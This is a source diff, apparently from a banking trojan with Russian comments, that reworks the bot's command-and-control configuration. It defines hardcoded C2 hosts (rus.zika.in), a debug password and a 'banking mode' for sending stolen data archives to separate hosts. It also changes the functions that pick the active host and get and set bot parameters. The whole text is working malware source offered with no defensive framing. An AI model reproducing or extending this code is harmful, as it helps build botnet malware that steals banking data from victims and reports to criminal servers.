@@ -47,8 +47,10 @@ namespace CONFIGDEBUGSTRINGS
 	//****************************************************************************
 	//  Хосты хранения хостов для отправки кабов
 	//****************************************************************************
-    char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = BOTPARAM_BANKHOSTS;
 
+	#ifdef USE_BANKING_HOSTS
+    	char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = BOTPARAM_BANKHOSTS;
+    #endif
 	//----------------------------------------------------------------------------
 	// Интервал отстука (в минутах). Строковое значение
 	//----------------------------------------------------------------------------
@@ -86,7 +88,9 @@ namespace CONFIGDEBUGSTRINGS
 
 	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";
 
-	char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "rus.zika.in\0";
+	#ifdef USE_BANKING_HOSTS
+		char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "rus.zika.in\0";
+	#endif
 
 	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
 	char BOT_PREFIX[]     = "BSSTEST";
@@ -99,7 +103,7 @@ namespace CONFIGDEBUGSTRINGS
 // Префикс бота работающего в режиме BANKING
 //----------------------------------------------------------------------------
 
-#ifndef BOTPLUG
+#ifdef USE_BANKING_PREFIX
 	char BOT_PREFIX_BANK[] = {'b','a','n','k','i','n','g', 0};
 #endif
 
@@ -193,7 +197,7 @@ bool IsBankingMode()
 	// В этом режиме настройки бота могут отличаться от обычных
 
 	string FileName = GetBankingModeFileName();
-	return !FileName.IsEmpty() && FileExistsA(FileName.t_str());
+	return FileExistsA(FileName.t_str());
 }
 
 //-----------------------------------------------------------------------------
@@ -204,10 +208,9 @@ char *GetPrefix(bool CheckBankingMode)
 	// Функция возвращает префикс бота
 
 
-	#ifndef BOTPLUG
-		// В не буткит сборках проверяем режим работы и
-		// в случае если включен режим банкинг возвращаем
-		// ,fyrbyu ghtabrc
+	#ifdef USE_BANKING_PREFIX
+		// Если включен режим банкинг возвращаем
+		// банкинг префикс
 		if (CheckBankingMode && IsBankingMode())
 			return BOT_PREFIX_BANK;
 	#endif
@@ -384,33 +387,18 @@ string GetActiveHost(bool CheckBankingMode)
 
 
 	// Проверяем режим банкинга
-	PCHAR Hosts;
-	DWORD Hash;
-	bool  Encrypted;
+	string Host;
 
-	bool IsBanking = CheckBankingMode && IsBankingMode();
+	#ifdef USE_BANKING_HOSTS
+		if (CheckBankingMode && IsBankingMode())
+		{
+			Host = GetActiveHostFromBuf2(BOT_BANKHOSTS_ARRAY, BOTPARAM_HASH_BANKHOSTS, BOTPARAM_ENCRYPTED_BANKHOSTS);
+			if (!Host.IsEmpty())
+				return Host;
+		}
+	#endif
 
-
-	if (IsBanking)
-	{
-		Hosts     = BOT_BANKHOSTS_ARRAY;
-		Encrypted = BOTPARAM_ENCRYPTED_BANKHOSTS;
-		Hash      = BOTPARAM_HASH_BANKHOSTS;
-	}
-	else
-	{
-		Hosts     = BOT_MAINHOSTS_ARRAY;
-		Encrypted = BOTPARAM_ENCRYPTED_MAINHOSTS;
-		Hash      = BOTPARAM_HASH_MAINHOSTS;
-    }
-
-
-	string Host = GetActiveHostFromBuf2(Hosts, Hash, Encrypted);
-
-	// В случае если в режиме BANKING не удалось получить
-	// рбочий хост, то берём его из основного мссива
-	if (Host.IsEmpty() && IsBanking)
-		Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS, BOTPARAM_ENCRYPTED_MAINHOSTS);
+	Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS, BOTPARAM_ENCRYPTED_MAINHOSTS);
 
 	return Host;
 }
@@ -656,7 +644,9 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 			case BOT_PARAM_HOSTS:        Value = BOT_MAINHOSTS_ARRAY; break;
 			case BOT_PARAM_KEY:          Value = DebugPassword; break;
 			case BOT_PARAM_DELAY:        Value = DebugDelay; break;
-			case BOT_PARAM_BANKINGHOSTS: Value = BOT_BANKHOSTS_ARRAY; break;
+			#ifdef USE_BANKING_HOSTS
+				case BOT_PARAM_BANKINGHOSTS: Value = BOT_BANKHOSTS_ARRAY; break;
+			#endif
 		default: return 0;
 		}
 	#else
@@ -666,7 +656,9 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 			case BOT_PARAM_KEY:          Value = MainPassword; break;
 			case BOT_PARAM_DELAY:        Value = Delay; break;
 			case BOT_PARAM_BOTPLUGNAME:  Value = BotPlugName; break;
+			#ifdef USE_BANKING_HOSTS
 			case BOT_PARAM_BANKINGHOSTS: Value = BOT_BANKHOSTS_ARRAY; break;
+			#endif
 		default: return 0;
 		}
 	#endif
@@ -784,12 +776,14 @@ BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
 
 
 			// Устанавливаем хосты BANKING режима
-			case BOT_PARAM_BANKINGHOSTS:
-				{
-					Buf = BOT_BANKHOSTS_ARRAY;
-					Max = MAX_BANKHOSTS_BUF_SIZE;
-					break;
-				}
+			#ifdef USE_BANKING_HOSTS
+				case BOT_PARAM_BANKINGHOSTS:
+					{
+						Buf = BOT_BANKHOSTS_ARRAY;
+						Max = MAX_BANKHOSTS_BUF_SIZE;
+						break;
+					}
+			#endif
 
 		default: return FALSE;;
 		}
